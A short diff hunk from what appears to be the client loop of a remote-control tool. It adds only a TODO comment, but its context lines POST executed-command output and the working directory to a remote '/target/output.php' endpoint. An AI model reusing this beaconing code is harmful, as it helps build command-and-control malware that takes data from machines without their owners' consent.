@@ -108,6 +108,7 @@ while 1:
 			r = requests.post ('http://' + caesar_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory)})
 
 	else:
+		# TODO: Check if delay != 10 before doing this
 		no_response += 1
 		if no_response == 60:
 			delay = 10
